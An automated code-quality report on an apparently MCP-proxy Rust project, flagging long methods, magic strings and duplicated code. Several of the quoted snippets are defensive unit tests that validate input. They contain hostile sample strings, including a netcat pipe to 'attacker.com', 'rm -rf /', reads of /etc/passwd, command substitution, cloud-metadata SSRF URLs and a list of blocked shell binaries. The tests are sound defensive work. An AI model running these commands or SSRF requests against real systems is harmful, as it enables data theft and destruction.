# Code Analysis Report

**Generated:** 2025-12-25 21:06:03 UTC

## Summary

- **Files Analyzed:** 16
- **Issues Found:** 1700
- **Analysis Duration:** 1.37s

---

## Issues by Severity

### 🔴 Critical (3 issues)

#### Long method 'run_cli' detected: 189 lines, 213 statements, complexity 36

- **File:** `src/main.rs`
- **Line:** 216

**Code:**
```
async fn run_cli(cli: Cli) -> anyhow::Result<()> {
    match cli.command {
        Commands::Init { format, force } => {
            // Initialize basic tracing for CLI commands
            let _guard = init_tracing(cli.verbose, None);
...
```

**Recommendation:** Consider breaking down 'run_cli' into smaller, more focused methods. Current metrics: LOC=189, Statements=213, Complexity=36, Nesting=10

---

#### Long method 'validate' detected: 109 lines, 138 statements, complexity 27

- **File:** `src/config/mod.rs`
- **Line:** 741

**Code:**
```
pub fn validate(&self) -> Result<(), ConfigError> {
        // Validate server port (must be 1-65535, not 0)
        if self.server.port == 0 {
            return Err(ConfigError::Validation(
                "server.port must be between 1 and 65535".to_string(),
...
```

**Recommendation:** Consider breaking down 'validate' into smaller, more focused methods. Current metrics: LOC=109, Statements=138, Complexity=27, Nesting=7

---

#### Long method 'validate' detected: 109 lines, 138 statements, complexity 27

- **File:** `src/config/mod.rs`
- **Line:** 741

**Code:**
```
pub fn validate(&self) -> Result<(), ConfigError> {
        // Validate server port (must be 1-65535, not 0)
        if self.server.port == 0 {
            return Err(ConfigError::Validation(
                "server.port must be between 1 and 65535".to_string(),
...
```

**Recommendation:** Consider breaking down 'validate' into smaller, more focused methods. Current metrics: LOC=109, Statements=138, Complexity=27, Nesting=7

---

### 🟠 High (702 issues)

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/main.rs`
- **Line:** 877

**Code:**
```
    fn test_generate_config_yaml() {
        let config = generate_config("yaml");
        assert!(config.contains("server:"));
        assert!(config.contains("transport:"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.8% similarity.

- **File:** `src/main.rs`
- **Line:** 569

**Code:**
```
    fn create_test_config_http(url: &str) -> Config {
        let config_str = format!(r#"
[server]
host = "127.0.0.1"
port = 3000

[upstream]
transport = "http"
url = "{}"

[rate_limit]
enabled = false
"#, url);
        let temp_file = NamedTempFile::new().unwrap();
        std::fs::write(temp_file.path(), &config_str).unwrap();
        Config::from_file(&temp_file.path().to_path_buf()).unwrap()
    }
```

---

#### Magic value '"result"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 500

---

#### Magic value '"result"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 502

---

#### Magic value '"serverInfo"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 503

---

#### Magic value '"application/json"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 526

---

#### Magic value '"Accept"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 547

---

#### Magic value '"text/event-stream"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 547

---

#### Magic value '"result"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 711

---

#### Magic value '"POST"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 796

---

#### Magic value '"POST"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 811

---

#### Magic value '"text/event-stream"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 830

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1041

**Code:**
```
    fn test_message_request_construction() {
        let msg = Message::request(1, "tools/list", None);
        assert_eq!(msg.jsonrpc, "2.0");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert_eq!(msg.method, Some("tools/list".to_string()));
        assert!(msg.params.is_none());
        assert!(msg.result.is_none());
        assert!(msg.error.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1081

**Code:**
```
    fn test_message_is_request() {
        let request = Message::request(1, "test", None);
        assert!(request.is_request());
        assert!(!request.is_notification());
        assert!(!request.is_response());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1081

**Code:**
```
    fn test_message_is_request() {
        let request = Message::request(1, "test", None);
        assert!(request.is_request());
        assert!(!request.is_notification());
        assert!(!request.is_response());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1089

**Code:**
```
    fn test_message_is_notification() {
        let notification = Message {
            jsonrpc: "2.0".to_string(),
            id: None,
            method: Some("cancelled".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(notification.is_notification());
        assert!(!notification.is_request());
        assert!(!notification.is_response());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1112

**Code:**
```
    fn test_message_serialization_roundtrip() {
        let msg = Message::request(42, "tools/list", None);
        let json = serde_json::to_string(&msg).unwrap();
        let parsed: Message = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.id, msg.id);
        assert_eq!(parsed.method, msg.method);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1267

**Code:**
```
    fn test_ssrf_blocks_cloud_metadata() {
        // AWS/GCP metadata endpoint
        let result = HttpTransport::new("http://169.254.169.254/latest/meta-data/".to_string());
        assert!(result.is_err());

        // Google metadata hostname
        let result = HttpTransport::new("http://metadata.google.internal/computeMetadata/".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1302

**Code:**
```
    fn test_validate_url_for_ssrf_direct() {
        // Test the validation function directly
        assert!(validate_url_for_ssrf("http://10.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://192.168.1.1/api").is_err());
        assert!(validate_url_for_ssrf("http://127.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://169.254.169.254/latest/meta-data/").is_err());
        assert!(validate_url_for_ssrf("file:///etc/passwd").is_err());

        // Invalid URL
        assert!(validate_url_for_ssrf("not-a-url").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1302

**Code:**
```
    fn test_validate_url_for_ssrf_direct() {
        // Test the validation function directly
        assert!(validate_url_for_ssrf("http://10.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://192.168.1.1/api").is_err());
        assert!(validate_url_for_ssrf("http://127.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://169.254.169.254/latest/meta-data/").is_err());
        assert!(validate_url_for_ssrf("file:///etc/passwd").is_err());

        // Invalid URL
        assert!(validate_url_for_ssrf("not-a-url").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1302

**Code:**
```
    fn test_validate_url_for_ssrf_direct() {
        // Test the validation function directly
        assert!(validate_url_for_ssrf("http://10.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://192.168.1.1/api").is_err());
        assert!(validate_url_for_ssrf("http://127.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://169.254.169.254/latest/meta-data/").is_err());
        assert!(validate_url_for_ssrf("file:///etc/passwd").is_err());

        // Invalid URL
        assert!(validate_url_for_ssrf("not-a-url").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1302

**Code:**
```
    fn test_validate_url_for_ssrf_direct() {
        // Test the validation function directly
        assert!(validate_url_for_ssrf("http://10.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://192.168.1.1/api").is_err());
        assert!(validate_url_for_ssrf("http://127.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://169.254.169.254/latest/meta-data/").is_err());
        assert!(validate_url_for_ssrf("file:///etc/passwd").is_err());

        // Invalid URL
        assert!(validate_url_for_ssrf("not-a-url").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1302

**Code:**
```
    fn test_validate_url_for_ssrf_direct() {
        // Test the validation function directly
        assert!(validate_url_for_ssrf("http://10.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://192.168.1.1/api").is_err());
        assert!(validate_url_for_ssrf("http://127.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://169.254.169.254/latest/meta-data/").is_err());
        assert!(validate_url_for_ssrf("file:///etc/passwd").is_err());

        // Invalid URL
        assert!(validate_url_for_ssrf("not-a-url").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1319

**Code:**
```
    fn test_command_injection_blocks_shell_metacharacters() {
        // Semicolon (command separator)
        assert!(validate_command_for_injection("echo; cat /etc/passwd").is_err());

        // Pipe
        assert!(validate_command_for_injection("cat | nc attacker.com").is_err());

        // Background/AND
        assert!(validate_command_for_injection("sleep 1 & cat secret").is_err());

        // Variable expansion
        assert!(validate_command_for_injection("echo $HOME").is_err());

        // Command substitution
        assert!(validate_command_for_injection("echo `whoami`").is_err());

        // Subshell
        assert!(validate_command_for_injection("(cat /etc/passwd)").is_err());

        // Brace expansion
        assert!(validate_command_for_injection("echo {a,b}").is_err());

        // Redirection
        assert!(validate_command_for_injection("cat < /etc/passwd").is_err());
        assert!(validate_command_for_injection("echo > /tmp/file").is_err());

        // Newlines (command separator)
        assert!(validate_command_for_injection("echo\ncat /etc/passwd").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1319

**Code:**
```
    fn test_command_injection_blocks_shell_metacharacters() {
        // Semicolon (command separator)
        assert!(validate_command_for_injection("echo; cat /etc/passwd").is_err());

        // Pipe
        assert!(validate_command_for_injection("cat | nc attacker.com").is_err());

        // Background/AND
        assert!(validate_command_for_injection("sleep 1 & cat secret").is_err());

        // Variable expansion
        assert!(validate_command_for_injection("echo $HOME").is_err());

        // Command substitution
        assert!(validate_command_for_injection("echo `whoami`").is_err());

        // Subshell
        assert!(validate_command_for_injection("(cat /etc/passwd)").is_err());

        // Brace expansion
        assert!(validate_command_for_injection("echo {a,b}").is_err());

        // Redirection
        assert!(validate_command_for_injection("cat < /etc/passwd").is_err());
        assert!(validate_command_for_injection("echo > /tmp/file").is_err());

        // Newlines (command separator)
        assert!(validate_command_for_injection("echo\ncat /etc/passwd").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1319

**Code:**
```
    fn test_command_injection_blocks_shell_metacharacters() {
        // Semicolon (command separator)
        assert!(validate_command_for_injection("echo; cat /etc/passwd").is_err());

        // Pipe
        assert!(validate_command_for_injection("cat | nc attacker.com").is_err());

        // Background/AND
        assert!(validate_command_for_injection("sleep 1 & cat secret").is_err());

        // Variable expansion
        assert!(validate_command_for_injection("echo $HOME").is_err());

        // Command substitution
        assert!(validate_command_for_injection("echo `whoami`").is_err());

        // Subshell
        assert!(validate_command_for_injection("(cat /etc/passwd)").is_err());

        // Brace expansion
        assert!(validate_command_for_injection("echo {a,b}").is_err());

        // Redirection
        assert!(validate_command_for_injection("cat < /etc/passwd").is_err());
        assert!(validate_command_for_injection("echo > /tmp/file").is_err());

        // Newlines (command separator)
        assert!(validate_command_for_injection("echo\ncat /etc/passwd").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1319

**Code:**
```
    fn test_command_injection_blocks_shell_metacharacters() {
        // Semicolon (command separator)
        assert!(validate_command_for_injection("echo; cat /etc/passwd").is_err());

        // Pipe
        assert!(validate_command_for_injection("cat | nc attacker.com").is_err());

        // Background/AND
        assert!(validate_command_for_injection("sleep 1 & cat secret").is_err());

        // Variable expansion
        assert!(validate_command_for_injection("echo $HOME").is_err());

        // Command substitution
        assert!(validate_command_for_injection("echo `whoami`").is_err());

        // Subshell
        assert!(validate_command_for_injection("(cat /etc/passwd)").is_err());

        // Brace expansion
        assert!(validate_command_for_injection("echo {a,b}").is_err());

        // Redirection
        assert!(validate_command_for_injection("cat < /etc/passwd").is_err());
        assert!(validate_command_for_injection("echo > /tmp/file").is_err());

        // Newlines (command separator)
        assert!(validate_command_for_injection("echo\ncat /etc/passwd").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1350

**Code:**
```
    fn test_command_injection_blocks_direct_shell() {
        // Direct shell commands should be blocked
        assert!(validate_command_for_injection("sh").is_err());
        assert!(validate_command_for_injection("bash").is_err());
        assert!(validate_command_for_injection("/bin/bash").is_err());
        assert!(validate_command_for_injection("/usr/bin/bash").is_err());
        assert!(validate_command_for_injection("zsh").is_err());
        assert!(validate_command_for_injection("cmd").is_err());
        assert!(validate_command_for_injection("powershell").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1350

**Code:**
```
    fn test_command_injection_blocks_direct_shell() {
        // Direct shell commands should be blocked
        assert!(validate_command_for_injection("sh").is_err());
        assert!(validate_command_for_injection("bash").is_err());
        assert!(validate_command_for_injection("/bin/bash").is_err());
        assert!(validate_command_for_injection("/usr/bin/bash").is_err());
        assert!(validate_command_for_injection("zsh").is_err());
        assert!(validate_command_for_injection("cmd").is_err());
        assert!(validate_command_for_injection("powershell").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1350

**Code:**
```
    fn test_command_injection_blocks_direct_shell() {
        // Direct shell commands should be blocked
        assert!(validate_command_for_injection("sh").is_err());
        assert!(validate_command_for_injection("bash").is_err());
        assert!(validate_command_for_injection("/bin/bash").is_err());
        assert!(validate_command_for_injection("/usr/bin/bash").is_err());
        assert!(validate_command_for_injection("zsh").is_err());
        assert!(validate_command_for_injection("cmd").is_err());
        assert!(validate_command_for_injection("powershell").is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1362

**Code:**
```
    fn test_command_injection_allows_safe_commands() {
        // Normal MCP server commands should be allowed
        assert!(validate_command_for_injection("node").is_ok());
        assert!(validate_command_for_injection("/usr/bin/node").is_ok());
        assert!(validate_command_for_injection("python").is_ok());
        assert!(validate_command_for_injection("python3").is_ok());
        assert!(validate_command_for_injection("/home/user/.local/bin/mcp-server").is_ok());
        assert!(validate_command_for_injection("npx").is_ok());
        assert!(validate_command_for_injection("uv").is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1362

**Code:**
```
    fn test_command_injection_allows_safe_commands() {
        // Normal MCP server commands should be allowed
        assert!(validate_command_for_injection("node").is_ok());
        assert!(validate_command_for_injection("/usr/bin/node").is_ok());
        assert!(validate_command_for_injection("python").is_ok());
        assert!(validate_command_for_injection("python3").is_ok());
        assert!(validate_command_for_injection("/home/user/.local/bin/mcp-server").is_ok());
        assert!(validate_command_for_injection("npx").is_ok());
        assert!(validate_command_for_injection("uv").is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1379

**Code:**
```
    fn test_args_injection_blocks_metacharacters() {
        // Arguments with shell metacharacters should be blocked
        let bad_args = vec![
            "-c".to_string(),
            "cat /etc/passwd".to_string(),  // This is fine
        ];
        assert!(validate_args_for_injection(&bad_args).is_ok());

        let bad_args = vec![
            "-c".to_string(),
            "cat; rm -rf /".to_string(),  // Semicolon in arg
        ];
        assert!(validate_args_for_injection(&bad_args).is_err());

        let bad_args = vec![
            "--script=$(whoami)".to_string(),  // Variable expansion
        ];
        assert!(validate_args_for_injection(&bad_args).is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1379

**Code:**
```
    fn test_args_injection_blocks_metacharacters() {
        // Arguments with shell metacharacters should be blocked
        let bad_args = vec![
            "-c".to_string(),
            "cat /etc/passwd".to_string(),  // This is fine
        ];
        assert!(validate_args_for_injection(&bad_args).is_ok());

        let bad_args = vec![
            "-c".to_string(),
            "cat; rm -rf /".to_string(),  // Semicolon in arg
        ];
        assert!(validate_args_for_injection(&bad_args).is_err());

        let bad_args = vec![
            "--script=$(whoami)".to_string(),  // Variable expansion
        ];
        assert!(validate_args_for_injection(&bad_args).is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1400

**Code:**
```
    fn test_args_injection_allows_safe_args() {
        // Normal arguments should be allowed
        let safe_args = vec![
            "--port".to_string(),
            "8080".to_string(),
            "--config".to_string(),
            "/path/to/config.json".to_string(),
        ];
        assert!(validate_args_for_injection(&safe_args).is_ok());

        // Arguments with spaces should be fine (shell won't split them)
        let safe_args = vec![
            "path with spaces/server.js".to_string(),
        ];
        assert!(validate_args_for_injection(&safe_args).is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1525

**Code:**
```
    fn test_validate_url_ssrf_protection() {
        // Private IP ranges
        assert!(validate_url_for_ssrf("http://127.0.0.1/api").is_err());
        assert!(validate_url_for_ssrf("http://localhost/api").is_err()); // resolves to 127.0.0.1
        assert!(validate_url_for_ssrf("http://10.0.0.5/api").is_err());
        assert!(validate_url_for_ssrf("http://192.168.1.1/api").is_err());
        assert!(validate_url_for_ssrf("http://172.16.0.1/api").is_err());
        
        // Cloud metadata
        assert!(validate_url_for_ssrf("http://169.254.169.254/latest/meta-data").is_err());
        assert!(validate_url_for_ssrf("http://metadata.google.internal/").is_err());
        
        // Schemes
        assert!(validate_url_for_ssrf("ftp://example.com").is_err());
        assert!(validate_url_for_ssrf("file:///etc/passwd").is_err());
        
        // Valid
        assert!(validate_url_for_ssrf("https://api.example.com/v1").is_ok());
        assert!(validate_url_for_ssrf("http://example.com/v1").is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1611

**Code:**
```
    fn test_is_private_ipv6_mapped_ipv4() {
        // IPv6-mapped IPv4 private addresses should be blocked
        let ipv6_mapped_private: Ipv6Addr = "::ffff:192.168.1.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_private));

        let ipv6_mapped_loopback: Ipv6Addr = "::ffff:127.0.0.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_loopback));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1611

**Code:**
```
    fn test_is_private_ipv6_mapped_ipv4() {
        // IPv6-mapped IPv4 private addresses should be blocked
        let ipv6_mapped_private: Ipv6Addr = "::ffff:192.168.1.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_private));

        let ipv6_mapped_loopback: Ipv6Addr = "::ffff:127.0.0.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_loopback));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1611

**Code:**
```
    fn test_is_private_ipv6_mapped_ipv4() {
        // IPv6-mapped IPv4 private addresses should be blocked
        let ipv6_mapped_private: Ipv6Addr = "::ffff:192.168.1.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_private));

        let ipv6_mapped_loopback: Ipv6Addr = "::ffff:127.0.0.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_loopback));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1611

**Code:**
```
    fn test_is_private_ipv6_mapped_ipv4() {
        // IPv6-mapped IPv4 private addresses should be blocked
        let ipv6_mapped_private: Ipv6Addr = "::ffff:192.168.1.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_private));

        let ipv6_mapped_loopback: Ipv6Addr = "::ffff:127.0.0.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_loopback));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1611

**Code:**
```
    fn test_is_private_ipv6_mapped_ipv4() {
        // IPv6-mapped IPv4 private addresses should be blocked
        let ipv6_mapped_private: Ipv6Addr = "::ffff:192.168.1.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_private));

        let ipv6_mapped_loopback: Ipv6Addr = "::ffff:127.0.0.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_loopback));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1621

**Code:**
```
    fn test_is_private_ipv6_unique_local() {
        // fc00::/7 unique local addresses
        let unique_local: Ipv6Addr = "fc00::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local));

        let unique_local_2: Ipv6Addr = "fd12:3456:789a::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local_2));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1621

**Code:**
```
    fn test_is_private_ipv6_unique_local() {
        // fc00::/7 unique local addresses
        let unique_local: Ipv6Addr = "fc00::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local));

        let unique_local_2: Ipv6Addr = "fd12:3456:789a::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local_2));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1621

**Code:**
```
    fn test_is_private_ipv6_unique_local() {
        // fc00::/7 unique local addresses
        let unique_local: Ipv6Addr = "fc00::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local));

        let unique_local_2: Ipv6Addr = "fd12:3456:789a::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local_2));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1621

**Code:**
```
    fn test_is_private_ipv6_unique_local() {
        // fc00::/7 unique local addresses
        let unique_local: Ipv6Addr = "fc00::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local));

        let unique_local_2: Ipv6Addr = "fd12:3456:789a::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local_2));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1631

**Code:**
```
    fn test_is_private_ipv6_link_local() {
        // fe80::/10 link-local
        let link_local: Ipv6Addr = "fe80::1".parse().unwrap();
        assert!(is_private_ipv6(&link_local));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1631

**Code:**
```
    fn test_is_private_ipv6_link_local() {
        // fe80::/10 link-local
        let link_local: Ipv6Addr = "fe80::1".parse().unwrap();
        assert!(is_private_ipv6(&link_local));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1631

**Code:**
```
    fn test_is_private_ipv6_link_local() {
        // fe80::/10 link-local
        let link_local: Ipv6Addr = "fe80::1".parse().unwrap();
        assert!(is_private_ipv6(&link_local));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1638

**Code:**
```
    fn test_is_private_ipv6_public() {
        // Public IPv6 addresses should not be private
        let public: Ipv6Addr = "2001:db8::1".parse().unwrap();
        assert!(!is_private_ipv6(&public));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1638

**Code:**
```
    fn test_is_private_ipv6_public() {
        // Public IPv6 addresses should not be private
        let public: Ipv6Addr = "2001:db8::1".parse().unwrap();
        assert!(!is_private_ipv6(&public));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1645

**Code:**
```
    fn test_is_private_ipv4_shared_address_space() {
        // 100.64.0.0/10 (RFC 6598 shared address space)
        let shared: Ipv4Addr = "100.64.0.1".parse().unwrap();
        assert!(is_private_ipv4(&shared));

        let shared_2: Ipv4Addr = "100.127.255.255".parse().unwrap();
        assert!(is_private_ipv4(&shared_2));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.5% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1071

**Code:**
```
    fn test_message_error_response() {
        let msg = Message::error_response(Some(serde_json::json!(1)), -32600, "Invalid Request");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert!(msg.result.is_none());
        let error = msg.error.unwrap();
        assert_eq!(error["code"], -32600);
        assert_eq!(error["message"], "Invalid Request");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.3% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1278

**Code:**
```
    fn test_ssrf_blocks_invalid_schemes() {
        // file:// scheme
        let result = HttpTransport::new("file:///etc/passwd".to_string());
        assert!(result.is_err());

        // ftp:// scheme
        let result = HttpTransport::new("ftp://example.com/file".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.2% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1081

**Code:**
```
    fn test_message_is_request() {
        let request = Message::request(1, "test", None);
        assert!(request.is_request());
        assert!(!request.is_notification());
        assert!(!request.is_response());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.2% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1267

**Code:**
```
    fn test_ssrf_blocks_cloud_metadata() {
        // AWS/GCP metadata endpoint
        let result = HttpTransport::new("http://169.254.169.254/latest/meta-data/".to_string());
        assert!(result.is_err());

        // Google metadata hostname
        let result = HttpTransport::new("http://metadata.google.internal/computeMetadata/".to_string());
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.0% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1060

**Code:**
```
    fn test_message_response_construction() {
        let result = serde_json::json!({"tools": []});
        let msg = Message::response(serde_json::json!(1), result.clone());
        assert_eq!(msg.jsonrpc, "2.0");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert!(msg.method.is_none());
        assert_eq!(msg.result, Some(result));
        assert!(msg.error.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.9% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 110

**Code:**
```
fn is_private_ipv6(ip: &Ipv6Addr) -> bool {
    // Loopback (::1)
    ip.is_loopback()
        // Unspecified (::)
        || ip.is_unspecified()
        // IPv4-mapped addresses - check the embedded IPv4
        || ip.to_ipv4_mapped().map(|v4| is_private_ipv4(&v4)).unwrap_or(false)
        // Unique local addresses (fc00::/7)
        || (ip.segments()[0] & 0xfe00) == 0xfc00
        // Link-local (fe80::/10)
        || (ip.segments()[0] & 0xffc0) == 0xfe80
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.8% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1089

**Code:**
```
    fn test_message_is_notification() {
        let notification = Message {
            jsonrpc: "2.0".to_string(),
            id: None,
            method: Some("cancelled".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(notification.is_notification());
        assert!(!notification.is_request());
        assert!(!notification.is_response());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.8% similarity.

- **File:** `src/transport/mod.rs`
- **Line:** 1267

**Code:**
```
    fn test_ssrf_blocks_cloud_metadata() {
        // AWS/GCP metadata endpoint
        let result = HttpTransport::new("http://169.254.169.254/latest/meta-data/".to_string());
        assert!(result.is_err());

        // Google metadata hostname
        let result = HttpTransport::new("http://metadata.google.internal/computeMetadata/".to_string());
        assert!(result.is_err());
    }
```

